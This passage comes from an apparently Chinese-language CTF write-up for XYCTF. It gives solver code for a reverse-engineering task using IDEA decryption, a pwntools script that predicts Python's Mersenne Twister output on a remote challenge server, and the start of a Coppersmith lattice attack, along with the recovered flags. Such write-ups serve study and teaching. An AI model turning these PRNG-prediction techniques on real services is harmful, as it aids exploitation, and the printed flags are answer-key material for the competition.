        <span class="token number">0xA3BC0075</span><span class="token punctuation">,</span> <span class="token number">0x63066CD9</span><span class="token punctuation">,</span> <span class="token number">0xFED41B77</span><span class="token punctuation">,</span> <span class="token number">0x3E6E77DB</span><span class="token punctuation">,</span> <span class="token number">0xA4D1C46C</span><span class="token punctuation">,</span> <span class="token number">0x646BA8C0</span><span class="token punctuation">,</span> <span class="token number">0x4ADFA541</span><span class="token punctuation">,</span> <span class="token number">0x8A65C9ED</span><span class="token punctuation">,</span>
        <span class="token number">0x10DA7A5A</span><span class="token punctuation">,</span> <span class="token number">0xD06016F6</span><span class="token punctuation">,</span> <span class="token number">0xF00F9345</span><span class="token punctuation">,</span> <span class="token number">0x30B5FFE9</span><span class="token punctuation">,</span> <span class="token number">0xAA0A4C5E</span><span class="token punctuation">,</span> <span class="token number">0x6AB020F2</span><span class="token punctuation">,</span> <span class="token number">0x44042D73</span><span class="token punctuation">,</span> <span class="token number">0x84BE41DF</span><span class="token punctuation">,</span>
        <span class="token number">0x1E01F268</span><span class="token punctuation">,</span> <span class="token number">0xDEBB9EC4</span><span class="token punctuation">,</span> <span class="token number">0x4369E96A</span><span class="token punctuation">,</span> <span class="token number">0x83D385C6</span><span class="token punctuation">,</span> <span class="token number">0x196C3671</span><span class="token punctuation">,</span> <span class="token number">0xD9D65ADD</span><span class="token punctuation">,</span> <span class="token number">0xF762575C</span><span class="token punctuation">,</span> <span class="token number">0x37D83BF0</span><span class="token punctuation">,</span>
        <span class="token number">0xAD678847</span><span class="token punctuation">,</span> <span class="token number">0x6DDDE4EB</span><span class="token punctuation">,</span> <span class="token number">0x76DC4190</span><span class="token punctuation">,</span> <span class="token number">0xB6662D3C</span><span class="token punctuation">,</span> <span class="token number">0x2CD99E8B</span><span class="token punctuation">,</span> <span class="token number">0xEC63F227</span><span class="token punctuation">,</span> <span class="token number">0xC2D7FFA6</span><span class="token punctuation">,</span> <span class="token number">0x026D930A</span><span class="token punctuation">,</span>
        <span class="token number">0x98D220BD</span><span class="token punctuation">,</span> <span class="token number">0x58684C11</span><span class="token punctuation">,</span> <span class="token number">0xC5BA3BBF</span><span class="token punctuation">,</span> <span class="token number">0x05005713</span><span class="token punctuation">,</span> <span class="token number">0x9FBFE4A4</span><span class="token punctuation">,</span> <span class="token number">0x5F058808</span><span class="token punctuation">,</span> <span class="token number">0x71B18589</span><span class="token punctuation">,</span> <span class="token number">0xB10BE925</span><span class="token punctuation">,</span>
        <span class="token number">0x2BB45A92</span><span class="token punctuation">,</span> <span class="token number">0xEB0E363E</span><span class="token punctuation">,</span> <span class="token number">0xCB61B38D</span><span class="token punctuation">,</span> <span class="token number">0x0BDBDF21</span><span class="token punctuation">,</span> <span class="token number">0x91646C96</span><span class="token punctuation">,</span> <span class="token number">0x51DE003A</span><span class="token punctuation">,</span> <span class="token number">0x7F6A0DBB</span><span class="token punctuation">,</span> <span class="token number">0xBFD06117</span><span class="token punctuation">,</span>
        <span class="token number">0x256FD2A0</span><span class="token punctuation">,</span> <span class="token number">0xE5D5BE0C</span><span class="token punctuation">,</span> <span class="token number">0x7807C9A2</span><span class="token punctuation">,</span> <span class="token number">0xB8BDA50E</span><span class="token punctuation">,</span> <span class="token number">0x220216B9</span><span class="token punctuation">,</span> <span class="token number">0xE2B87A15</span><span class="token punctuation">,</span> <span class="token number">0xCC0C7794</span><span class="token punctuation">,</span> <span class="token number">0x0CB61B38</span><span class="token punctuation">,</span>
        <span class="token number">0x9609A88F</span><span class="token punctuation">,</span> <span class="token number">0x56B3C423</span><span class="token punctuation">,</span> <span class="token number">0xD6D6A3E9</span><span class="token punctuation">,</span> <span class="token number">0x166CCF45</span><span class="token punctuation">,</span> <span class="token number">0x8CD37CF2</span><span class="token punctuation">,</span> <span class="token number">0x4C69105E</span><span class="token punctuation">,</span> <span class="token number">0x62DD1DDF</span><span class="token punctuation">,</span> <span class="token number">0xA2677173</span><span class="token punctuation">,</span>
        <span class="token number">0x38D8C2C4</span><span class="token punctuation">,</span> <span class="token number">0xF862AE68</span><span class="token punctuation">,</span> <span class="token number">0x65B0D9C6</span><span class="token punctuation">,</span> <span class="token number">0xA50AB56A</span><span class="token punctuation">,</span> <span class="token number">0x3FB506DD</span><span class="token punctuation">,</span> <span class="token number">0xFF0F6A71</span><span class="token punctuation">,</span> <span class="token number">0xD1BB67F0</span><span class="token punctuation">,</span> <span class="token number">0x11010B5C</span><span class="token punctuation">,</span>
        <span class="token number">0x8BBEB8EB</span><span class="token punctuation">,</span> <span class="token number">0x4B04D447</span><span class="token punctuation">,</span> <span class="token number">0x6B6B51F4</span><span class="token punctuation">,</span> <span class="token number">0xABD13D58</span><span class="token punctuation">,</span> <span class="token number">0x316E8EEF</span><span class="token punctuation">,</span> <span class="token number">0xF1D4E243</span><span class="token punctuation">,</span> <span class="token number">0xDF60EFC2</span><span class="token punctuation">,</span> <span class="token number">0x1FDA836E</span><span class="token punctuation">,</span>
        <span class="token number">0x856530D9</span><span class="token punctuation">,</span> <span class="token number">0x45DF5C75</span><span class="token punctuation">,</span> <span class="token number">0xD80D2BDB</span><span class="token punctuation">,</span> <span class="token number">0x18B74777</span><span class="token punctuation">,</span> <span class="token number">0x8208F4C0</span><span class="token punctuation">,</span> <span class="token number">0x42B2986C</span><span class="token punctuation">,</span> <span class="token number">0x6C0695ED</span><span class="token punctuation">,</span> <span class="token number">0xACBCF941</span><span class="token punctuation">,</span>
        <span class="token number">0x36034AF6</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCC00</span><span class="token punctuation">,</span> <span class="token number">0x00000100</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span>
        <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">uint32_t</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0x46A95BAD</span><span class="token punctuation">,</span>
        <span class="token number">0x1CAC84B6</span><span class="token punctuation">,</span>
        <span class="token number">0xA67CB2B2</span><span class="token punctuation">,</span>
        <span class="token number">0x32188937</span><span class="token punctuation">,</span>
        <span class="token number">0x4872D39F</span><span class="token punctuation">,</span>
        <span class="token number">0xF2A2E59B</span><span class="token punctuation">,</span>
        <span class="token number">0x011B94D2</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token comment">// 爆破前7字节</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> <span class="token number">132</span><span class="token punctuation">;</span> c<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>box1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token punctuation">)</span>c <span class="token operator">^</span> <span class="token number">0x79</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xB0E0E879</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 后16字节进行IDEA解密</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span>
        <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token comment">// unsigned int key[4] = &#123;</span>
    <span class="token comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x6C98B242</span><span class="token punctuation">,</span> <span class="token number">0x78563412</span><span class="token punctuation">,</span> <span class="token number">0x3E6A6D0D</span><span class="token punctuation">,</span> <span class="token number">0xEFCDAB89</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    code keys_input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        keys_input<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>
        keys_input<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> cipher1<span class="token punctuation">,</span> cipher2<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token generic-function"><span class="token function">i</span> <span class="token generic class-name"><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            cipher1<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span></span></span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
            cipher2<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">subkeys_get</span><span class="token punctuation">(</span>keys_input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">inv_subkeys_get</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plain1 <span class="token operator">=</span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>cipher1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plain2 <span class="token operator">=</span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>cipher2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">uint64_t</span> plain1_val <span class="token operator">=</span> plain1<span class="token punctuation">.</span><span class="token function">to_ullong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> plain2_val <span class="token operator">=</span> plain2<span class="token punctuation">.</span><span class="token function">to_ullong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">uint8_t</span> dec2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>dec2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>plain2_val<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>dec2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>plain1_val<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">reverse</span><span class="token punctuation">(</span>dec2<span class="token punctuation">,</span> dec2 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.16s\n"</span><span class="token punctuation">,</span> dec2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{moshui_build_this_block}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    choose <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">': >>> '</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> choose <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            denominator <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'input the denominator: >>> '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'INPUT NUMBERS'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        nominator <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> denominator <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO YOU DONT'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nominator<span class="token punctuation">&#125;</span></span><span class="token string">//</span><span class="token interpolation"><span class="token punctuation">&#123;</span>denominator<span class="token punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>nominator<span class="token operator">//</span>denominator<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
</code></pre>

<p>题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> randcrack <span class="token keyword">import</span> RandCrack
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.217.82"</span><span class="token punctuation">,</span><span class="token number">28739</span> <span class="token punctuation">)</span>
data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'>>> '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'tor: >>> '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    line<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>


RC <span class="token operator">=</span> RandCrack<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    RC<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'er: >>>'</span><span class="token punctuation">)</span>
rand1 <span class="token operator">=</span> RC<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">11000</span><span class="token punctuation">)</span>
rand2 <span class="token operator">=</span> RC<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>
correct_ans <span class="token operator">=</span> rand1 <span class="token operator">//</span> rand2

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>correct_ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>  </code></pre>

<blockquote>
<p>XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}</p>
</blockquote>
<h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><p>题目构造了复数对象，混淆了m的实部和虚部的低128位,已知</p>
<p><img src="/images/cry1-1744626745339-67.png" alt="cry1" loading="lazy"></p>
<p>二元copper解低位即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ChaCha20
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> itertools

<span class="token keyword">def</span> <span class="token function">small_roots</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> bounds<span class="token punctuation">,</span> m<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> d<span class="token punctuation">:</span>
        d <span class="token operator">=</span> f<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span>

    R <span class="token operator">=</span> f<span class="token punctuation">.</span>base_ring<span class="token punctuation">(</span><span class="token punctuation">)</span>
    N <span class="token operator">=</span> R<span class="token punctuation">.</span>cardinality<span class="token punctuation">(</span><span class="token punctuation">)</span>

    f <span class="token operator">/=</span> f<span class="token punctuation">.</span>coefficients<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> f<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>

    G <span class="token operator">=</span> Sequence<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        base <span class="token operator">=</span> N <span class="token operator">^</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> f <span class="token operator">^</span> i
        <span class="token keyword">for</span> shifts <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span>f<span class="token punctuation">.</span>nvariables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            g <span class="token operator">=</span> base <span class="token operator">*</span> prod<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>power<span class="token punctuation">,</span> f<span class="token punctuation">.</span>variables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> shifts<span class="token punctuation">)</span><span class="token punctuation">)</span>
            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">)</span>

    B<span class="token punctuation">,</span> monomials <span class="token operator">=</span> G<span class="token punctuation">.</span>coefficient_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span>
    monomials <span class="token operator">=</span> vector<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>

    factors <span class="token operator">=</span> <span class="token punctuation">[</span>monomial<span class="token punctuation">(</span><span class="token operator">*</span>bounds<span class="token punctuation">)</span> <span class="token keyword">for</span> monomial <span class="token keyword">in</span> monomials<span class="token punctuation">]</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> factor <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
        B<span class="token punctuation">.</span>rescale_col<span class="token punctuation">(</span>i<span class="token punctuation">,</span> factor<span class="token punctuation">)</span>

    B <span class="token operator">=</span> B<span class="token punctuation">.</span>dense_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>

    B <span class="token operator">=</span> B<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> factor <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
        B<span class="token punctuation">.</span>rescale_col<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">/</span> factor<span class="token punctuation">)</span>

    H <span class="token operator">=</span> Sequence<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> B <span class="token operator">*</span> monomials<span class="token punctuation">)</span><span class="token punctuation">:</span>
        H<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">)</span>
        I <span class="token operator">=</span> H<span class="token punctuation">.</span>ideal<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> I<span class="token punctuation">.</span>dimension<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            H<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> I<span class="token punctuation">.</span>dimension<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> root <span class="token keyword">in</span> I<span class="token punctuation">.</span>variety<span class="token punctuation">(</span>ring<span class="token operator">=</span>ZZ<span class="token punctuation">)</span><span class="token punctuation">:</span>
                root <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>R<span class="token punctuation">(</span>root<span class="token punctuation">[</span>var<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> var <span class="token keyword">in</span> f<span class="token punctuation">.</span>variables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
            <span class="token keyword">return</span> roots

    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>


<span class="token keyword">class</span> <span class="token class-name">Complex</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> re<span class="token punctuation">,</span> im<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>re <span class="token operator">=</span> re
        self<span class="token punctuation">.</span>im <span class="token operator">=</span> im

    <span class="token keyword">def</span> <span class="token function">__mul__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        re_ <span class="token operator">=</span> self<span class="token punctuation">.</span>re <span class="token operator">*</span> c<span class="token punctuation">.</span>re <span class="token operator">-</span> self<span class="token punctuation">.</span>im <span class="token operator">*</span> c<span class="token punctuation">.</span>im
        im_ <span class="token operator">=</span> self<span class="token punctuation">.</span>re <span class="token operator">*</span> c<span class="token punctuation">.</span>im <span class="token operator">+</span> self<span class="token punctuation">.</span>im <span class="token operator">*</span> c<span class="token punctuation">.</span>re
